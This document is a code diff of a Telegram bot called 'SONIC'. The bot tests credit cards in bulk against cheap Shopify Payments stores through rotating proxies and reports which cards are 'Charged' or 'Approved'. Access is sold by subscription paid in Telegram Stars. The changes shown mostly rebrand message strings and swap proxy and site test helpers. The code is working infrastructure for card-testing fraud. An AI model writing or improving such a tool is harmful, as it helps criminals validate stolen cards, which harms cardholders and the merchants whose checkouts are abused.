     user_id = event.sender_id
@@ -1155,18 +1189,18 @@ async def add_site_cmd(event):
         await send_with_retry(user_id, premium_emoji("❌ Add proxies first using /addproxy"), parse_mode='html')
         return
     
-    msg = await send_with_retry(user_id, premium_emoji(f"🔄 Testing {site}..."), parse_mode='html')
-    result = await test_site_fast(site, random.choice(proxies))
+    msg = await send_with_retry(user_id, premium_emoji(f"🔄 SONIC testing {site}..."), parse_mode='html')
+    result = await test_site(site, random.choice(proxies))
     
     if result['status'] == 'alive':
         sites = load_sites()
         if site not in sites:
             save_sites(sites + [site])
-            await msg.edit(premium_emoji(f"✅ Site added: {site}\n{result['reason']}"), parse_mode='html')
+            await msg.edit(premium_emoji(f"✅ Site added: {site}"), parse_mode='html')
         else:
             await msg.edit(premium_emoji(f"⚠️ Site already exists: {site}"), parse_mode='html')
     else:
-        await msg.edit(premium_emoji(f"❌ Cannot add site: {result['reason']}"), parse_mode='html')
+        await msg.edit(premium_emoji(f"❌ Could not add site!"), parse_mode='html')
 
 @bot.on(events.NewMessage(pattern=r'^/rmsite\s+'))
 async def rmsite_cmd(event):
@@ -1229,7 +1263,7 @@ async def addsites_cmd(event):
         'expires': time.time() + PENDING_TIMEOUT
     }
     
-    await send_with_retry(user_id, premium_emoji(f"💰 <b>Select price range to filter sites:</b>\n\n{len(new_sites)} sites found.\nOnly Shopify sites with min price within range will be added."), buttons=get_price_filter_keyboard(), parse_mode='html')
+    await send_with_retry(user_id, premium_emoji(f"💰 <b>Select price range to filter sites:</b>\n\n{len(new_sites)} sites found.\nOnly Shopify sites with min price within range will be added.\n\nYou have 5 minutes to select."), buttons=get_price_filter_keyboard(), parse_mode='html')
 
 # ==================== فحص المواقع ====================
 @bot.on(events.NewMessage(pattern='/sitecheck'))
@@ -1307,12 +1341,12 @@ async def chkproxy_cmd(event):
     if len(args) < 2:
         await send_with_retry(user_id, premium_emoji("❌ Usage: /chkproxy ip:port:user:pass"), parse_mode='html')
         return
-    msg = await send_with_retry(user_id, premium_emoji(f"🔄 Checking..."), parse_mode='html')
-    res = await test_proxy_fast(args[1])
+    msg = await send_with_retry(user_id, premium_emoji(f"🔄 SONIC checking..."), parse_mode='html')
+    res = await test_proxy_direct(args[1])
     if res['status'] == 'alive':
-        await msg.edit(premium_emoji(f"✅ <b>ALIVE</b>\n<code>{args[1]}</code>"), parse_mode='html')
+        await msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n<code>{args[1]}</code>"), parse_mode='html')
     else:
-        await msg.edit(premium_emoji(f"❌ <b>DEAD</b>\n{res['reason']}"), parse_mode='html')
+        await msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n{res['reason']}"), parse_mode='html')
 
 @bot.on(events.NewMessage(pattern='/rmproxy'))
 async def rmproxy_cmd(event):
@@ -1347,7 +1381,7 @@ async def proxy_check_cmd(event):
         return
     
     total = len(proxies)
-    msg = await send_with_retry(user_id, premium_emoji(f"⚡ Fast checking {total} proxies...\n\n⏱️ Estimated: ~{max(3, total // 15)} seconds"), parse_mode='html')
+    msg = await send_with_retry(user_id, premium_emoji(f"⚡ SONIC checking {total} proxies...\n\n⏱️ Estimated: ~{max(3, total // 15)} seconds"), parse_mode='html')
     
     batch_size = 20
     alive = []
@@ -1356,8 +1390,7 @@ async def proxy_check_cmd(event):
     
     for i in range(0, total, batch_size):
         batch = proxies[i:i+batch_size]
-        tasks = [test_proxy_fast(p) for p in batch]
-        results = await asyncio.gather(*tasks)
+        results = await test_proxy_batch(batch)
         
         for res in results:
             if res['status'] == 'alive':
@@ -1366,11 +1399,11 @@ async def proxy_check_cmd(event):
                 dead.append(res['proxy'])
         
         checked += len(batch)
-        await msg.edit(premium_emoji(f"⚡ Checking proxies...\n\n📊 {checked}/{total}\n✅ Alive: {len(alive)}\n❌ Dead: {len(dead)}"), parse_mode='html')
+        await msg.edit(premium_emoji(f"⚡ SONIC checking...\n\n📊 {checked}/{total}\n✅ Alive: {len(alive)}\n❌ Dead: {len(dead)}"), parse_mode='html')
     
     save_user_proxies(user_id, alive)
     
-    result_text = f"""✅ <b>Proxy Check Complete!</b>
+    result_text = f"""✅ <b>SONIC Proxy Check Complete!</b>
 
 📊 Total: {total}
 ✅ Alive: {len(alive)}
@@ -1404,7 +1437,7 @@ async def mcancel_cmd(event):
         if key.startswith(f"{user_id}_"):
             del active_sessions[key]
     user_current_check[user_id] = False
-    await send_with_retry(user_id, premium_emoji("✅ Mass check cancelled"), parse_mode='html')
+    await send_with_retry(user_id, premium_emoji("✅ SONIC mass check cancelled"), parse_mode='html')
 
 # ==================== فحص الكروت الفردي ====================
 @bot.on(events.NewMessage(pattern=r'^/cc\s+'))
@@ -1414,7 +1447,7 @@ async def single_cc_cmd(event):
         await send_with_retry(user_id, premium_emoji("🚫 Banned"), parse_mode='html')
         return
     if user_current_check.get(user_id):
-        await send_with_retry(user_id, premium_emoji("⏳ Wait for previous check to finish"), parse_mode='html')
+        await send_with_retry(user_id, premium_emoji("⏳ SONIC is busy. Wait for previous check to finish"), parse_mode='html')
         return
     
     if not is_admin(user_id) and not is_user_subscribed(user_id):
@@ -1443,7 +1476,7 @@ async def single_cc_cmd(event):
     
     card = cards[0]
     user_current_check[user_id] = True
-    msg = await send_with_retry(user_id, premium_emoji(f"⚡ Checking <code>{card}</code>..."), parse_mode='html')
+    msg = await send_with_retry(user_id, premium_emoji(f"⚡ SONIC checking <code>{card}</code>..."), parse_mode='html')
     
     try:
         res = await check_card_with_retry(card, sites, proxies, 3)
@@ -1456,7 +1489,7 @@ async def single_cc_cmd(event):
         
         time_left = get_user_time_left(user_id)
         await msg.edit(premium_emoji(f"""<b>━━━━━━━━━━━━━━━━━</b>
-<b>💠 Result</b>
+<b>💠 SONIC Result</b>
 <blockquote>{'💎' if res['status']=='Charged' else '✅' if res['status']=='Approved' else '❌'} Status: {res['status'].upper()}</blockquote>
 <blockquote>💳 Card: <code>{card}</code></blockquote>
 <blockquote>📝 Response: {res['message'][:100]}</blockquote>
@@ -1479,7 +1512,7 @@ async def mass_check_cmd(event):
         await send_with_retry(user_id, premium_emoji("🚫 Banned"), parse_mode='html')
         return
     if user_current_check.get(user_id):
-        await send_with_retry(user_id, premium_emoji("⏳ Wait for previous check to finish"), parse_mode='html')
+        await send_with_retry(user_id, premium_emoji("⏳ SONIC is busy. Wait for previous check to finish"), parse_mode='html')
         return
     
     if not is_admin(user_id) and not is_user_subscribed(user_id):
@@ -1507,7 +1540,7 @@ async def mass_check_cmd(event):
     
     path = await reply.download_media()
     user_pending_mass[user_id] = {'file_path': path, 'expires': time.time() + PENDING_TIMEOUT}
-    await send_with_retry(user_id, premium_emoji("📋 Select mode:"), buttons=[
+    await send_with_retry(user_id, premium_emoji("📋 SONIC Select mode:"), buttons=[
         [Button.inline("💎 CHARGES ONLY", b"mode_charges")],
         [Button.inline("💎 + ✅ ALL HITS", b"mode_all")],
         [Button.inline("❌ Cancel", b"mode_cancel")]
@@ -1522,7 +1555,7 @@ async def mode_select(event):
     
     if event.data == b"mode_cancel":
         os.remove(user_pending_mass.pop(user_id)['file_path'])
-        await event.edit(premium_emoji("❌ Cancelled"), parse_mode='html')
+        await event.edit(premium_emoji("❌ SONIC mass check cancelled"), parse_mode='html')
         return
     
     mode = "charges_only" if event.data == b"mode_charges" else "all_hits"
@@ -1539,11 +1572,11 @@ async def mode_select(event):
     
     max_cards = MAX_CARDS_PER_COMBO if not is_admin(user_id) else ADMIN_MAX_CARDS
     if len(cards) > max_cards:
-        await event.edit(premium_emoji(f"⚠️ Max {max_cards} cards per combo.\nYour file has {len(cards)} cards.\nChecking first {max_cards} cards."), parse_mode='html')
+        await event.edit(premium_emoji(f"⚠️ SONIC max {max_cards} cards per combo.\nYour file has {len(cards)} cards.\nChecking first {max_cards} cards."), parse_mode='html')
         cards = cards[:max_cards]
     
     user_current_check[user_id] = True
-    msg = await event.edit(premium_emoji(f"🚀 Starting {len(cards)} cards..."), parse_mode='html')
+    msg = await event.edit(premium_emoji(f"🚀 SONIC starting {len(cards)} cards..."), parse_mode='html')
     session_key = f"{user_id}_{msg.id}"
     active_sessions[session_key] = {'paused': False}
     results = {'charged': [], 'approved': [], 'dead': [], 'total': len(cards), 'checked': 0, 'start': time.time()}
@@ -1593,7 +1626,7 @@ async def mode_select(event):
                 try:
                     elapsed = int(time.time() - results['start'])
                     recent = "\n".join([f"{'💎' if c['status']=='Charged' else '✅' if c['status']=='Approved' else '❌'} {c['card'][:8]}*** | {c['msg'][:30]}" for c in card_responses[-5:]])
-                    await msg.edit(premium_emoji(f"""<b>💠 Progress</b>
+                    await msg.edit(premium_emoji(f"""<b>💠 SONIC Progress</b>
 <blockquote>💎 {len(results['charged'])} | ✅ {len(results['approved'])} | ❌ {len(results['dead'])}</blockquote>
 <blockquote>📊 {results['checked']}/{results['total']}</blockquote>
 <blockquote>⏱️ {elapsed//3600}h {(elapsed%3600)//60}m {elapsed%60}s</blockquote>
@@ -1616,7 +1649,7 @@ async def mode_select(event):
             hits = "No hits"
         time_left = get_user_time_left(user_id)
         await msg.edit(premium_emoji(f"""<b>━━━━━━━━━━━━━━━━━</b>
-<b>⚡ Final Results</b>
+<b>⚡ SONIC Final Results</b>
 <blockquote>💎 {len(results['charged'])} | ✅ {len(results['approved'])} | ❌ {len(results['dead'])}</blockquote>
 <blockquote>⏱️ Time: {elapsed//3600}h {(elapsed%3600)//60}m {elapsed%60}s</blockquote>
 <b>━━━━━━━━━━━━━━━━━</b>
@@ -1635,22 +1668,22 @@ async def control_handler(event):
     session_key = f"{user_id}_{event.message_id}"
     if event.data == b"pause" and session_key in active_sessions:
         active_sessions[session_key]['paused'] = True
-        await event.answer("⏸️ Paused")
+        await event.answer("⏸️ SONIC Paused")
     elif event.data == b"resume" and session_key in active_sessions:
         active_sessions[session_key]['paused'] = False
-        await event.answer("▶️ Resumed")
+        await event.answer("▶️ SONIC Resumed")
     elif event.data == b"stop" and session_key in active_sessions:
         del active_sessions[session_key]
-        await event.answer("🛑 Stopped")
-        await event.edit(premium_emoji("🛑 Stopped by user"), parse_mode='html')
+        await event.answer("🛑 SONIC Stopped")
+        await event.edit(premium_emoji("🛑 SONIC check stopped by user"), parse_mode='html')
 
-# ==================== أوامر الأدمن الإضافية ====================
+# ==================== أوامر الأدمن ====================
 @bot.on(events.NewMessage(pattern='/admin'))
 async def admin_cmd(event):
     if not is_admin(event.sender_id):
-        await send_with_retry(event.sender_id, premium_emoji("❌ Only admin can use this command."), parse_mode='html')
+        await send_with_retry(event.sender_id, premium_emoji("❌ Only SONIC admin can use this command."), parse_mode='html')
         return
-    await send_with_retry(event.sender_id, premium_emoji("👑 Admin Panel"), buttons=get_admin_menu_keyboard(), parse_mode='html')
+    await send_with_retry(event.sender_id, premium_emoji("👑 SONIC Admin Panel"), buttons=get_admin_menu_keyboard(), parse_mode='html')
 
 @bot.on(events.NewMessage(pattern='/gencode'))
 async def gencode_cmd(event):
@@ -1665,7 +1698,7 @@ async def gencode_cmd(event):
             pass
     seconds = hours * 3600
     code = create_activation_code(seconds)
-    await send_with_retry(event.sender_id, premium_emoji(f"✅ <b>Code Generated!</b>\n\nCode: <code>{code}</code>\nDuration: {hours} hours"), parse_mode='html')
+    await send_with_retry(event.sender_id, premium_emoji(f"✅ <b>SONIC Code Generated!</b>\n\nCode: <code>{code}</code>\nDuration: {hours} hours"), parse_mode='html')
 
 @bot.on(events.NewMessage(pattern='/block'))
 async def block_cmd(event):
@@ -1707,15 +1740,15 @@ async def broadcast_cmd(event):
         return
     users = get_all_users()
     sent = 0
-    status_msg = await send_with_retry(event.sender_id, premium_emoji(f"📢 Broadcasting to {len(users)} users..."), parse_mode='html')
+    status_msg = await send_with_retry(event.sender_id, premium_emoji(f"📢 SONIC broadcasting to {len(users)} users..."), parse_mode='html')
     for uid in users:
         try:
-            await send_with_retry(int(uid), premium_emoji(f"📢 <b>Broadcast</b>\n\n{msg}"), parse_mode='html')
+            await send_with_retry(int(uid), premium_emoji(f"📢 <b>SONIC Broadcast</b>\n\n{msg}"), parse_mode='html')
             sent += 1
             await asyncio.sleep(0.2)
         except:
             pass
-    await status_msg.edit(premium_emoji(f"✅ Broadcast complete!\n\nSent: {sent}\nFailed: {len(users) - sent}"), parse_mode='html')
+    await status_msg.edit(premium_emoji(f"✅ SONIC broadcast complete!\n\nSent: {sent}\nFailed: {len(users) - sent}"), parse_mode='html')
 
 @bot.on(events.NewMessage(pattern='/addtime'))
 async def addtime_cmd(event):
@@ -1747,7 +1780,7 @@ async def addtime_cmd(event):
         save_users(users)
         await send_with_retry(event.sender_id, premium_emoji(f"✅ Added {hours} hours to user {target}"), parse_mode='html')
     except:
-        await send_with_retry(event.sender_id, premium_emoji("❌ Invalid input"), parse_mode='html')
+        await send_with_retry(event.sender_id, premium_emoji("❌ Invalid input. Usage: /addtime user_id hours"), parse_mode='html')
 
 @bot.on(events.NewMessage(pattern='/users'))
 async def users_cmd(event):
@@ -1757,7 +1790,7 @@ async def users_cmd(event):
     if not users:
         await send_with_retry(event.sender_id, premium_emoji("No users found"), parse_mode='html')
         return
-    txt = "<b>📋 Users List:</b>\n\n"
+    txt = "<b>📋 SONIC Users List:</b>\n\n"
     for uid, data in list(users.items())[:50]:
         username = data.get('username', '?')
         blocked = "🚫" if data.get('blocked', False) else "✅"
@@ -1783,7 +1816,7 @@ async def user_cmd(event):
             expiry_str = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
         else:
             expiry_str = "No subscription"
-        txt = f"""<b>👤 User {target}</b>
+        txt = f"""<b>👤 SONIC User {target}</b>
 ├ Username: @{data.get('username', '?')}
 ├ Blocked: {data.get('blocked', False)}
 ├ Premium: {data.get('premium', False)}
@@ -1807,7 +1840,7 @@ async def stats_cmd(event):
     blocked = len([u for u in users.values() if u.get('blocked', False)])
     codes = len(load_codes())
     sites = len(load_sites())
-    await send_with_retry(event.sender_id, premium_emoji(f"""<b>📊 Bot Statistics</b>
+    await send_with_retry(event.sender_id, premium_emoji(f"""<b>📊 SONIC Bot Statistics</b>
 
 ├ 👥 Total Users: {total}
 ├ ⭐ Active Users: {active}
@@ -1826,7 +1859,7 @@ async def subscribe_cmd(event):
     for key, plan in STAR_PRICES.items():
         kb.append([Button.inline(f"⭐ {plan['name']} - {plan['stars']}⭐", f"sub_{key}")])
     kb.append([Button.inline("🔙 Back", b"main_menu")])
-    await send_with_retry(user_id, premium_emoji("⭐ <b>Buy Subscription</b>\n\nPay with Telegram Stars.\nGet time-based access!\n\nPlans:\n• 1 Hour - 30⭐\n• 12 Hours - 50⭐\n• 1 Day - 100⭐\n• 3 Days - 250⭐\n• 1 Week - 500⭐"), buttons=kb, parse_mode='html')
+    await send_with_retry(user_id, premium_emoji("⭐ <b>SONIC Premium Subscription</b>\n\nPay with Telegram Stars.\nGet time-based access!\n\nPlans:\n• 1 Hour - 30⭐\n• 12 Hours - 50⭐\n• 1 Day - 100⭐\n• 3 Days - 250⭐\n• 1 Week - 500⭐\n\n🔥 Unlimited card checks during subscription!"), buttons=kb, parse_mode='html')
 
 @bot.on(events.NewMessage(pattern=r'^/redeem\s+'))
 async def redeem_cmd(event):
@@ -1835,7 +1868,7 @@ async def redeem_cmd(event):
         await send_with_retry(user_id, premium_emoji("🚫 Banned"), parse_mode='html')
         return
     if is_admin(user_id):
-        await send_with_retry(user_id, premium_emoji("👑 You are admin, no need to redeem!"), parse_mode='html')
+        await send_with_retry(user_id, premium_emoji("👑 You are SONIC admin, no need to redeem!"), parse_mode='html')
         return
     args = event.text.split(maxsplit=1)
     if len(args) < 2:
@@ -1853,7 +1886,7 @@ async def main():
         if str(admin) not in users:
             users[str(admin)] = {
                 'user_id': admin, 
-                'username': 'admin', 
+                'username': 'sonic_admin', 
                 'registered_at': datetime.now().isoformat(), 
                 'subscription_expiry': time.time() + 999999999, 
                 'premium': True, 
@@ -1868,7 +1901,8 @@ async def main():
     asyncio.create_task(check_for_payments())
     
     print("=" * 55)
-    print("✅ SONIC BOT STARTED (Fixed Site Check)")
+    print("✅ SONIC BOT STARTED SUCCESSFULLY!")
+    print("⚡ SONIC BOT (Telethon + Stars)")
     print(f"👑 Admins: {ADMIN_IDS}")
     print(f"⭐ Subscription plans:")
     print(f"   - 1 Hour: 30 stars")
@@ -1878,7 +1912,7 @@ async def main():
     print(f"   - 1 Week: 500 stars")
     print(f"📊 Max cards per combo: {MAX_CARDS_PER_COMBO}")
     print(f"🌐 Sites file: sites.txt ({len(load_sites())} sites)")
-    print(f"🔌 Gateway filter: Shopify only")
+    print(f"🔌 Gateway filter: Shopify Payments only")
     print(f"💰 Price filter: 1$-10$, 5$-20$, 10$-30$, or No filter")
     print(f"⚙️ Workers: {MAX_WORKERS}")
     print("=" * 55)
